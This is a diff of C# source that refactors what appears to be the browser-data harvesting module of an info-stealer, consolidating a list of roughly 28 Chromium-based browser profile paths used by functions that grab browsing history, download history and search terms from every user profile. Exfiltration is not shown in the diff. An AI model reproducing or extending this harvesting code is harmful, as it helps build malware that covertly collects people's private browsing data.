@@ -1,4 +1,4 @@
-﻿using SQL_Helper;
+using SQL_Helper;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -99,43 +99,8 @@ namespace History
         private static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         private static string defaultPath = LocalApplicationData + @"\Google\Chrome\User Data" + @"\Default\History";
 
-        private static DateTime GetDateFromWebkitTime(string s)
-        {
-            // Ref: http://linuxsleuthing.blogspot.co.uk/2011/06/decoding-google-chrome-timestamps-in.html
-            // https://social.msdn.microsoft.com/Forums/vstudio/en-US/6bb627dc-83d6-4272-933f-329fb63d295a/parsing-dates-and-times?forum=vbgeneral
-            var secsFromEpoch = Convert.ToDouble(s) * 0.000001;
-            var epoch = new DateTime(1601, 1, 1);
 
-            return epoch.Add(TimeSpan.FromSeconds(secsFromEpoch));
-        }
-        private static List<string> GetAllProfiles(string DirectoryPath)
-        {
-            List<string> loginDataFiles = new List<string>
-            {
-                DirectoryPath + @"\Default\History",
-                DirectoryPath + @"\History"
-            };
-
-            if (Directory.Exists(DirectoryPath))
-            {
-                foreach (string dir in Directory.GetDirectories(DirectoryPath))
-                {
-                    if (dir.Contains("Profile"))
-                        loginDataFiles.Add(dir + @"\History");
-                }
-            }
-
-            return loginDataFiles;
-        }
-
-
-
-
-
-
-        public static List<History>History_Grab()
-        {
-            Dictionary<string, string> ChromiumPaths = new Dictionary<string, string>()
+        private static Dictionary<string, string> ChromiumPaths = new Dictionary<string, string>()
             {
                 {
                     "Chrome",
@@ -250,6 +215,45 @@ namespace History
                     Path.Combine(LocalApplicationData, @"Microsoft\Edge\User Data")
                 }
             };
+
+
+        private static DateTime GetDateFromWebkitTime(string s)
+        {
+            // Ref: http://linuxsleuthing.blogspot.co.uk/2011/06/decoding-google-chrome-timestamps-in.html
+            // https://social.msdn.microsoft.com/Forums/vstudio/en-US/6bb627dc-83d6-4272-933f-329fb63d295a/parsing-dates-and-times?forum=vbgeneral
+            var secsFromEpoch = Convert.ToDouble(s) * 0.000001;
+            var epoch = new DateTime(1601, 1, 1);
+
+            return epoch.Add(TimeSpan.FromSeconds(secsFromEpoch));
+        }
+        private static List<string> GetAllProfiles(string DirectoryPath)
+        {
+            List<string> loginDataFiles = new List<string>
+            {
+                DirectoryPath + @"\Default\History",
+                DirectoryPath + @"\History"
+            };
+
+            if (Directory.Exists(DirectoryPath))
+            {
+                foreach (string dir in Directory.GetDirectories(DirectoryPath))
+                {
+                    if (dir.Contains("Profile"))
+                        loginDataFiles.Add(dir + @"\History");
+                }
+            }
+
+            return loginDataFiles;
+        }
+
+
+
+
+
+
+        public static List<History>History_Grab()
+        {
+          
 
             var list = new List<History>();
 
@@ -334,122 +338,6 @@ namespace History
 
         public static List<Download_History> Downloads_Grab()
         {
-            Dictionary<string, string> ChromiumPaths = new Dictionary<string, string>()
-            {
-                {
-                    "Chrome",
-                    LocalApplicationData + @"\Google\Chrome\User Data"
-                },
-                {
-                    "Opera",
-                    Path.Combine(ApplicationData, @"Opera Software\Opera Stable")
-                },
-                {
-                    "Yandex",
-                    Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data")
-                },
-                {
-                    "360 Browser",
-                    LocalApplicationData + @"\360Chrome\Chrome\User Data"
-                },
-                {
-                    "Comodo Dragon",
-                    Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data")
-                },
-                {
-                    "CoolNovo",
-                    Path.Combine(LocalApplicationData, @"MapleStudio\ChromePlus\User Data")
-                },
-                {
-                    "SRWare Iron",
-                    Path.Combine(LocalApplicationData, @"Chromium\User Data")
-                },
-                {
-                    "Torch Browser",
-                    Path.Combine(LocalApplicationData, @"Torch\User Data")
-                },
-                {
-                    "Brave Browser",
-                    Path.Combine(LocalApplicationData, @"BraveSoftware\Brave-Browser\User Data")
-                },
-                {
-                    "Iridium Browser",
-                    LocalApplicationData + @"\Iridium\User Data"
-                },
-                {
-                    "7Star",
-                    Path.Combine(LocalApplicationData, @"7Star\7Star\User Data")
-                },
-                {
-                    "Amigo",
-                    Path.Combine(LocalApplicationData, @"Amigo\User Data")
-                },
-                {
-                    "CentBrowser",
-                    Path.Combine(LocalApplicationData, @"CentBrowser\User Data")
-                },
-                {
-                    "Chedot",
-                    Path.Combine(LocalApplicationData, @"Chedot\User Data")
-                },
-                {
-                    "CocCoc",
-                    Path.Combine(LocalApplicationData, @"CocCoc\Browser\User Data")
-                },
-                {
-                    "Elements Browser",
-                    Path.Combine(LocalApplicationData, @"Elements Browser\User Data")
-                },
-                {
-                    "Epic Privacy Browser",
-                    Path.Combine(LocalApplicationData, @"Epic Privacy Browser\User Data")
-                },
-                {
-                    "Kometa",
-                    Path.Combine(LocalApplicationData, @"Kometa\User Data")
-                },
-                {
-                    "Orbitum",
-                    Path.Combine(LocalApplicationData, @"Orbitum\User Data")
-                },
-                {
-                    "Sputnik",
-                    Path.Combine(LocalApplicationData, @"Sputnik\Sputnik\User Data")
-                },
-                {
-                    "uCozMedia",
-                    Path.Combine(LocalApplicationData, @"uCozMedia\Uran\User Data")
-                },
-                {
-                    "Vivaldi",
-                    Path.Combine(LocalApplicationData, @"Vivaldi\User Data")
-                },
-                {
-                    "Sleipnir 6",
-                    Path.Combine(ApplicationData, @"Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer")
-                },
-                {
-                    "Citrio",
-                    Path.Combine(LocalApplicationData, @"CatalinaGroup\Citrio\User Data")
-                },
-                {
-                    "Coowon",
-                    Path.Combine(LocalApplicationData, @"Coowon\Coowon\User Data")
-                },
-                {
-                    "Liebao Browser",
-                    Path.Combine(LocalApplicationData, @"liebao\User Data")
-                },
-                {
-                    "QIP Surf",
-                    Path.Combine(LocalApplicationData, @"QIP Surf\User Data")
-                },
-                {
-                    "Edge Chromium",
-                    Path.Combine(LocalApplicationData, @"Microsoft\Edge\User Data")
-                }
-            };
-
             var list = new List<Download_History>();
 
             foreach (var item in ChromiumPaths)
@@ -590,121 +478,6 @@ namespace History
 
         public static List<keyword_search_terms> SearchTerms_Grab()
         {
-            Dictionary<string, string> ChromiumPaths = new Dictionary<string, string>()
-            {
-                {
-                    "Chrome",
-                    LocalApplicationData + @"\Google\Chrome\User Data"
-                },
-                {
-                    "Opera",
-                    Path.Combine(ApplicationData, @"Opera Software\Opera Stable")
-                },
-                {
-                    "Yandex",
-                    Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data")
-                },
-                {
-                    "360 Browser",
-                    LocalApplicationData + @"\360Chrome\Chrome\User Data"
-                },
-                {
-                    "Comodo Dragon",
-                    Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data")
-                },
-                {
-                    "CoolNovo",
-                    Path.Combine(LocalApplicationData, @"MapleStudio\ChromePlus\User Data")
-                },
-                {
-                    "SRWare Iron",
-                    Path.Combine(LocalApplicationData, @"Chromium\User Data")
-                },
-                {
-                    "Torch Browser",
-                    Path.Combine(LocalApplicationData, @"Torch\User Data")
-                },
-                {
-                    "Brave Browser",
-                    Path.Combine(LocalApplicationData, @"BraveSoftware\Brave-Browser\User Data")
-                },
-                {
-                    "Iridium Browser",
-                    LocalApplicationData + @"\Iridium\User Data"
-                },
-                {
-                    "7Star",
-                    Path.Combine(LocalApplicationData, @"7Star\7Star\User Data")
-                },
-                {
-                    "Amigo",
-                    Path.Combine(LocalApplicationData, @"Amigo\User Data")
-                },
-                {
-                    "CentBrowser",
-                    Path.Combine(LocalApplicationData, @"CentBrowser\User Data")
-                },
-                {
-                    "Chedot",
-                    Path.Combine(LocalApplicationData, @"Chedot\User Data")
-                },
-                {
-                    "CocCoc",
-                    Path.Combine(LocalApplicationData, @"CocCoc\Browser\User Data")
-                },
-                {
-                    "Elements Browser",
-                    Path.Combine(LocalApplicationData, @"Elements Browser\User Data")
-                },
-                {
-                    "Epic Privacy Browser",
-                    Path.Combine(LocalApplicationData, @"Epic Privacy Browser\User Data")
-                },
-                {
-                    "Kometa",
-                    Path.Combine(LocalApplicationData, @"Kometa\User Data")
-                },
-                {
-                    "Orbitum",
-                    Path.Combine(LocalApplicationData, @"Orbitum\User Data")
-                },
-                {
-                    "Sputnik",
-                    Path.Combine(LocalApplicationData, @"Sputnik\Sputnik\User Data")
-                },
-                {
-                    "uCozMedia",
-                    Path.Combine(LocalApplicationData, @"uCozMedia\Uran\User Data")
-                },
-                {
-                    "Vivaldi",
-                    Path.Combine(LocalApplicationData, @"Vivaldi\User Data")
-                },
-                {
-                    "Sleipnir 6",
-                    Path.Combine(ApplicationData, @"Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer")
-                },
-                {
-                    "Citrio",
-                    Path.Combine(LocalApplicationData, @"CatalinaGroup\Citrio\User Data")
-                },
-                {
-                    "Coowon",
-                    Path.Combine(LocalApplicationData, @"Coowon\Coowon\User Data")
-                },
-                {
-                    "Liebao Browser",
-                    Path.Combine(LocalApplicationData, @"liebao\User Data")
-                },
-                {
-                    "QIP Surf",
-                    Path.Combine(LocalApplicationData, @"QIP Surf\User Data")
-                },
-                {
-                    "Edge Chromium",
-                    Path.Combine(LocalApplicationData, @"Microsoft\Edge\User Data")
-                }
-            };
 
             var list = new List<keyword_search_terms>();
 
